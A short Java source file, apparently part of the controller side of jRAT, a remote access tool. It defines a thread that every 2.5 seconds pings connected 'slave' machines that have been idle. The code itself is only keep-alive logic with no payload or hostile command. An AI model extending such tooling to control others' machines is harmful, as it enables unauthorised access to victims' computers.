package se.jrat.client.threads;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;

public class ThreadPing extends Thread {

	public ThreadPing() {
		super("Ping thread");
	}

	public void run() {
		while (true) {
			try {
				for (int i = 0; i < Main.connections.size(); i++) {
					AbstractSlave slave = Main.connections.get(i);

					long sinceLastRead = System.currentTimeMillis() - slave.getCountingInputStream().getLastRead();
					long sinceLastWrite = System.currentTimeMillis() - slave.getCountingOutputStream().getLastWrite();
					
					if (sinceLastRead > 2500L || sinceLastWrite > 2500L) {
						slave.beginPing();					
					}
				}
				Thread.sleep(2500L);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
